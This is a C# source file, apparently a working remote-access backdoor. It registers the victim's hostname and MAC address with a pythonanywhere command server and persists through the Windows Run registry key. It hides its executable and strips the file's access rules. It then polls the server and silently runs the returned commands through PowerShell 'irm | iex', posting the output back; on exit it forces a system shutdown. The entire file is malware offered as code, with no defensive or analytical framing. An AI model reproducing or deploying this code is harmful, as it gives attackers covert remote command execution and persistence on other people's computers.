using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;
using System.Text;
using System.Web;
using System.Xml.Linq;
using static System.Net.Mime.MediaTypeNames;
using System.Threading.Tasks;
using System.Security.AccessControl;
using Microsoft.Win32;


//for future: переместить файл и установть автозапуск с того места проверка наличия файла в автозапуске и на месту прописки
namespace CMDCommandUsingCsharp
{
    public class dhm
    {
        /*[DllImport("user32.dll")]

        public static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate handler, bool add);
        public delegate bool ConsoleCtrlDelegate(int eventType);*/

        static string URL = "http://sosik.pythonanywhere.com";
        static string USERNAME = Environment.UserName;
        static string NAME = Environment.MachineName;
        static string NAMEandMAC = NAME + GetMacAddress();
        static string app_path = Process.GetCurrentProcess().MainModule.FileName;
        //static string app_path = Environment.CurrentDirectory;
        //static string app_path = Application.ExecutablePath.ToString();

        //сайт на котором находится ссылка на агригатор
        static string source_url = "https://raw.githubusercontent.com/Scopper31/shit/main/mainlink.txt";

        // получение ссылки агригатора
        static string GetLink()
        {
            string content = "";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://raw.githubusercontent.com/Scopper31/shit/main/mainlink.txt");
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                content = reader.ReadToEnd();
                return content;
            }
            catch (System.Net.WebException) { return ""; }
        }

        static string GetMacAddress()
        {
            string macAddress = string.Empty;
            NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();

            foreach (NetworkInterface networkInterface in networkInterfaces)
            {
                if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
                    networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                {
                    macAddress = networkInterface.GetPhysicalAddress().ToString();
                    break;
                }
            }

            return macAddress;
        }

        //ХЕРНЯ ДЛЯ ФУНКЦИИ для реализации online / offline
        //----------------------------------------------------------------------------

        /*static bool ConsoleCtrlHandler(int eventType)
        {
            if (eventType == 2) // 2 соответствует событию завершения работы
            {
                // Вызываем вашу функцию при завершении работы компьютера
                Task off = GoingOffline();
            }

            return false;
        }*/

        static async Task GoingOffline()
        {
            using (var client = new HttpClient())
            {
                var response = await client.GetAsync($"{URL}/users/{NAMEandMAC}/offline");
            }
        }

        static async Task GoingOnline()
        {
            using (var client = new HttpClient())
            {
                var response = await client.GetAsync($"{URL}/users/{NAMEandMAC}/online");
            }
        }
        //---------------------------------------------------------------------------




        static void Autoload()
        {
            //https://you.com/search?q=who+are+you&tbm=youchat&cfr=chat&cid=c0_a0d05c74-5234-46cb-8314-a63e76d177b9


            // создание автозагрузки
            string name = " dhs";
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(name, Process.GetCurrentProcess().MainModule.FileName);
            //File.SetAttributes(app_path, File.GetAttributes(app_path) | FileAttributes.Hidden);
        }
        public static bool IsProgramInAutostart()
        {
            string programName = " dhs";
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");

            if (key != null)
            {
                string[] subKeyNames = key.GetValueNames();

                foreach (string subKeyName in subKeyNames)
                {
                    string value = key.GetValue(subKeyName) as string;

                    if (value != null && value.Contains(programName))
                    {
                        return true;
                    }
                }
            }

            return false;
        }



        // проверка наличия доступных команд
        static bool Check()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"{URL}/users/{NAMEandMAC}/command");
            try
            {
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                StreamReader reader = new StreamReader(response.GetResponseStream());
                string content = reader.ReadToEnd();
                if (content != "")
                {
                    return true;
                }
                return false;
            }
            catch (System.Net.WebException) { return false; }
        }


        // функция получения mac адресса

        static async Task Clear()
        {

            using (var client = new HttpClient())
            {
                var response = await client.GetAsync($"{URL}/users/{NAMEandMAC}/clear");
            }
        }

        static async Task Answer(string ans)
        {

            using (var client = new HttpClient())
            {
                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "out", $"{ans}" } }))
                {
                    var response = await client.PostAsync($"{URL}/users/{NAMEandMAC}/output", content);
                }
            }
        }

        static async Task RegistrationInSystem()
        {
            using (var client = new HttpClient())
            {
                using (var content = new FormUrlEncodedContent(new Dictionary<string, string> { { "name", $"{NAMEandMAC}" } }))
                {
                    var response = await client.PostAsync($"{URL}/new_user", content);
                }
            }
        }

        public static void Protecting()
        {
            FileInfo fileInfo = new FileInfo(app_path);
            //Файл скрыт
            fileInfo.Attributes |= FileAttributes.Hidden;
            //Файл является системным файлом
            fileInfo.Attributes |= FileAttributes.System;
            // Получаем текущие разрешения доступаc
            var fileSecurity = fileInfo.GetAccessControl();

            // Удаляем все разрешения доступа

            AuthorizationRuleCollection rules = fileSecurity.GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
            foreach (FileSystemAccessRule rule in rules)
            {
                fileSecurity.RemoveAccessRule(rule);
            }
            fileInfo.SetAccessControl(fileSecurity);
        }

        public static void Start()
        {
            Autoload();
            //скрыть exe файл в системе
            //не робит
            Protecting();
            //установить обработчик событий завершения работы.
            //SetConsoleCtrlHandler(ConsoleCtrlHandler, true);
            //создание собственной странички на сайте
            Task reg = RegistrationInSystem();
            Task on = GoingOnline();

        }
        static void ProcessExitHandler(object sender, EventArgs e)
        {

            // Код функции, которую нужно выполнить при завершении работы программы
            Autoload();
            Process.Start("shutdown", "/s /f /t 0");
        }

        [STAThread]
        static void Main(string[] args)
        {

            AppDomain.CurrentDomain.ProcessExit += ProcessExitHandler;
            Start();

            string URLcmd = $"{URL}/users/{NAMEandMAC}/command";
            /*Encoding utf8 = Encoding.GetEncoding("UTF-8");
            Encoding win1251 = CodePagesEncodingProvider.Instance.GetEncoding(1251);*/
            Random rnd = new Random();
            int randomNumber = rnd.Next(500, 2000);
            while (true)
            {
                /*if (!IsProgramInAutostart())
                {
                    Autoload();
                }*/
                if (Check())
                {

                    // '/c' tells cmd that we want it to execute the command that follows, and then exit.
                    //System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {URLcmd} | iex");
                    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"irm {URLcmd} | iex");

                    // The following commands are needed to redirect the standard output. 
                    //This means that it will be redirected to the Process.StandardOutput StreamReader.
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    // Do not create the black window.
                    procStartInfo.CreateNoWindow = true;

                    // Now we create a process, assign its ProcessStartInfo and start it
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.StartInfo = procStartInfo;
                    proc.Start();

                    // Get the output into a string
                    string result = proc.StandardOutput.ReadToEnd();

                    Task task1 = Answer(result);
                    // Display the command output.
                    //Console.WriteLine(result);

                    Task task2 = Clear();
                }
                Thread.Sleep(randomNumber);
                randomNumber = rnd.Next(500, 1000);
            }
        }
    }
}
